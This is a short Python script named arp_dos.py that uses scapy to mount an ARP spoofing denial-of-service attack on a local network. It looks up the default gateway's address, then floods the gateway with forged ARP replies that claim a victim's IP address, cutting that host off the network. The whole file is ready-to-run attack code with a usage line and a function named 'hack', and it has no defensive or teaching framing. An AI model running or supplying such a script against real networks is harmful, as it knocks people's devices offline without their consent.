#coding:utf-8
#example :sudo  python arp_dos.py  192.168.1.103
from scapy.all import ARP,send
import os,re,sys
def get_gateway_ip():
    t=os.popen('route -n')
    for i in t:
        if i.startswith('0.0.0.0'):
            r=re.split("\s+",i)
            return r[1]
def get_gateway_hw(ip):
    t=os.popen('arp -e %s' % ip)
    for i in t:
        if i.startswith(ip):
            r=re.split("\s+",i)
            return r[2]

def hack(hackip):
    ip=get_gateway_ip()
    hw=get_gateway_hw(ip)
    arp=ARP(op=2,pdst=ip,hwdst=hw,psrc=hackip)
    #os.popen('ifconfig eth0 %s' % hackip )
    while 1:
        send(arp)
def help():
    print ("USEAGE: sudo python arp_dos.py 192.168.1.100")
def main():
    if len(sys.argv) != 2:
        help()
    else:
        hack(sys.argv[1])
if __name__=="__main__":
    main()